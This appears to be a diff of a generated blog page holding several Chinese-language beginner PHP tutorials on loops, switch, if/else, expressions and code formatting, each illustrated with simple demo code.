&lt;?php</span><br><span class="line">		$i = 1;</span><br><span class="line">		while ($i &lt;= 10) &#123;</span><br><span class="line">			echo &quot;$i&lt;br&gt;&quot;;</span><br><span class="line">			$i++;</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;$i&quot;;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>循环变量i，共循环次数为10此，输出结果将会是从1~11的输出结果。</p>
+<h4 id="do……while"><a href="#do……while" class="headerlink" title="do……while"></a>do……while<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/13.php%20while.md/20201105194907832_216051252.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 1;</span><br><span class="line">		do &#123;</span><br><span class="line">			echo &quot;$one&quot;;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			$one++;</span><br><span class="line">		&#125; while ($one &lt;= 10);</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>du……while循环与while循环的区别在于，do……while循环不先判断while条件是否成立，当执行完一次之后，才会判断是否达成while条件。</p>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/12.PHP Switch /">PHP Switch</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>Switch和if……else之间的区别就是，使用Switch可以避免沉长的if……else语句，而Switch只需要<strong>switch……case……default</strong></p>
+<h4 id="switch……case……default"><a href="#switch……case……default" class="headerlink" title="switch……case……default"></a>switch……case……default</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 10;</span><br><span class="line">		switch ($one) &#123;</span><br><span class="line">			case &#x27;10&#x27;:</span><br><span class="line">				echo &quot;\$one的变量为$one&quot;;</span><br><span class="line">				break;</span><br><span class="line">				</span><br><span class="line">			default:</span><br><span class="line">				echo &quot;为达到基本要求&quot;;</span><br><span class="line">				break;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="switch……case……case……default"><a href="#switch……case……case……default" class="headerlink" title="switch……case……case……default"></a>switch……case……case……default</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">		$one = 11;</span><br><span class="line">		switch ($one) &#123;</span><br><span class="line">			case &#x27;10&#x27;:</span><br><span class="line">				echo &quot;变量为$one&quot;;</span><br><span class="line">				break;</span><br><span class="line">			case &#x27;11&#x27;:</span><br><span class="line">				echo &quot;变量为$one&quot;;</span><br><span class="line">				break;</span><br><span class="line">			default:</span><br><span class="line">				echo &quot;为满足基本要求&quot;;</span><br><span class="line">				break;</span><br><span class="line">		&#125;</span><br><span class="line">	 ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>DA</th>
+<th>FA</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>break</td>
+<td>结束</td>
+<td></td>
+</tr>
+<tr>
+<td>continue</td>
+<td>跳过</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>扩展：JavaScript Break or Continue</strong></p>
+<p><strong>Break 方法</strong></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/12.php%20switch%20.md/20201105194845872_1624486367.png">与Continue方法不同的是，当执行到break方法时下面的将不会继续执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myFunction()&quot;</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;data&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="string">&quot;&quot;</span>,i=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (i==<span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            a = a + <span class="string">&quot;输出&quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;data&quot;</span>).<span class="property">innerHTML</span> = a;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Continue 方法</strong></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/12.php%20switch%20.md/20201105194827638_409145949.png"> JavaScript Continue方法与“break”方法不同，当执行到此的时候将会直接跳过从而继续执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myFunction()&quot;</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;data&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="string">&quot;&quot;</span>,i=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (i==<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">continue</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            a = a + <span class="string">&quot;输出&quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;data&quot;</span>).<span class="property">innerHTML</span> = a;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/12.php%20switch%20.md/20201105194806562_198380782.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form name=&quot;formone&quot; method=&quot;post&quot;&gt;</span><br><span class="line">		&lt;select name=&quot;hobby&quot;&gt;</span><br><span class="line">			&lt;option&gt;请选择你的兴趣爱好&lt;/option&gt;</span><br><span class="line">			&lt;option&gt;唱歌&lt;/option&gt;</span><br><span class="line">			&lt;option&gt;跳舞&lt;/option&gt;</span><br><span class="line">			&lt;option&gt;R_AP&lt;/option&gt;</span><br><span class="line">		&lt;/select&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">	&lt;?php </span><br><span class="line">		if (isset($_POST[&#x27;button&#x27;])) &#123;				// 提交POST</span><br><span class="line">			$hobby = $_POST[&#x27;hobby&#x27;];				// 从文本框获取数据</span><br><span class="line">			switch ($hobby) &#123;</span><br><span class="line">				case &quot;唱歌&quot;:</span><br><span class="line">					echo &quot;你的兴趣爱好是唱&quot;;</span><br><span class="line">					break;</span><br><span class="line">				case &quot;跳舞&quot;:</span><br><span class="line">					echo &quot;你的兴趣爱好是跳&quot;;</span><br><span class="line">					break;</span><br><span class="line">				case &quot;R_AP&quot;:</span><br><span class="line">					echo &quot;你的兴趣爱好是RAP&quot;;</span><br><span class="line">					break;</span><br><span class="line">				default:</span><br><span class="line">					echo &quot;请选择你的兴趣爱好&quot;;</span><br><span class="line">					break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/11.PHP if……else/">PHP if……else</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>if……else也即称之为<strong>条件控制语句</strong>，也是通常在结构化程序设计语言之中较为重要的一项技术，通常结构用用 <strong>if……else</strong> or <strong>if……elseif</strong>[^if条件判断语句可进行嵌套]</p>
+<h4 id="if"><a href="#if" class="headerlink" title="if "></a>if <img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/11.php%20if%E2%80%A6%E2%80%A6else.md/20201105194712122_935306313.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 10;</span><br><span class="line">		if ($one == 10) &#123;</span><br><span class="line">			echo &quot;\$one变量为10&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当$one为10时输出if ($one &#x3D;&#x3D;10){} 中的代码块</p>
+<h4 id="if……else"><a href="#if……else" class="headerlink" title="if……else"></a>if……else<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/11.php%20if%E2%80%A6%E2%80%A6else.md/20201105194727754_1622323942.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 10;</span><br><span class="line">		if ($one == 10) &#123;</span><br><span class="line">			echo &quot;变量为10&quot;;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;不为&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当变量（$one）为等于10时，通过<strong>if……else</strong>判断将会输出语句。而如果当变量不为（$one）不为10时将会执行<strong>else</strong>代码块中的内容。</p>
+<h4 id="if……elseif……else"><a href="#if……elseif……else" class="headerlink" title="if……elseif……else!"></a>if……elseif……else!<img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/11.php%20if%E2%80%A6%E2%80%A6else.md/20201105194739122_1060332780.png"></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 9;</span><br><span class="line">		if ($one == 10) &#123;</span><br><span class="line">			echo &quot;变量为 10&quot;;</span><br><span class="line">		&#125; elseif ($one == 9) &#123;</span><br><span class="line">			echo &quot;变量为 9&quot;;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;不为&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>变量$one为“9”时，达到了<strong>elseif</strong>的要求，从而输出elseif代码块，而if为第一要求，$one没有达到，再而执行<strong>elseif</strong></p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;test&quot; name=&quot;score&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;开始&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">	&lt;?php </span><br><span class="line">		if (isset($_POST[&#x27;score&#x27;])) &#123;  			// 判断按钮是否按下</span><br><span class="line">			$score = $_POST[&#x27;score&#x27;];			// 从score中获取到的信息，并获取score中的值</span><br><span class="line">			if ($score &gt;=90 &amp;&amp; $score &lt;=100) &#123;</span><br><span class="line">				echo &quot;A+&quot;;</span><br><span class="line">			&#125; elseif ($score &lt;= 90) &#123;</span><br><span class="line">				echo &quot;D+&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>判断文本框输入值，<strong>如果输入值小于或等于90，则为D+，但如果时大于等于90则输出A+</strong></p>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/10.PHP 表达式/">PHP 表达式</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>当错做书和操作字符组成在一起即可被统称为<strong>“表达式</strong>”，表达式一般由一个或多给操作符连接起来的操作数，<strong>主要用来计算确定的值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php </span><br><span class="line">		$one = 10;</span><br><span class="line">		$two = 20;</span><br><span class="line">		$three = $one+$two*$one;</span><br><span class="line">		if ($three == 210) &#123;</span><br><span class="line">			echo &quot;数值达标&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时上方代码块则可以生成是一个PHP的表达式，因为它是由$one、$two、$three最后通过赋值运算符进行计算，再通过if进行判断的，符合了PHP表达式的标准与格式。</p>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/php/1.PHP 格式与注释/">PHP 格式与注释</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/php/" rel="tag">php</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<h3 id="代码格式"><a href="#代码格式" class="headerlink" title="代码格式"></a>代码格式</h3><h4 id="通用代码格式-（-lt-php）"><a href="#通用代码格式-（-lt-php）" class="headerlink" title="通用代码格式 （&lt;?php）"></a>通用代码格式 （&lt;?php）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="简便代码格式-（-lt-）-默认禁止"><a href="#简便代码格式-（-lt-）-默认禁止" class="headerlink" title="简便代码格式 （&lt;?）[^默认禁止]"></a>简便代码格式 （&lt;?）[^默认禁止]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="百分号代码格式-lt-默认禁止"><a href="#百分号代码格式-lt-默认禁止" class="headerlink" title="百分号代码格式 (&lt;%) [^默认禁止]"></a>百分号代码格式 (&lt;%) [^默认禁止]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">	<span class="comment">// ……</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="JavaScript-元素标记-language-x3D-”php”"><a href="#JavaScript-元素标记-language-x3D-”php”" class="headerlink" title="JavaScript 元素标记 (language&#x3D;”php”)"></a>JavaScript 元素标记 (language&#x3D;”php”)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><h4 id="单行注释-（-x2F-x2F-）"><a href="#单行注释-（-x2F-x2F-）" class="headerlink" title="单行注释 （&#x2F;&#x2F;）"></a>单行注释 （&#x2F;&#x2F;）</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/1.php%20%E6%A0%BC%E5%BC%8F%E4%B8%8E%E6%B3%A8%E9%87%8A.md/20201105192151427_1412988718.png"></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">&quot;Hello,world!&quot;</span>); <span class="comment">// 你好世界！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
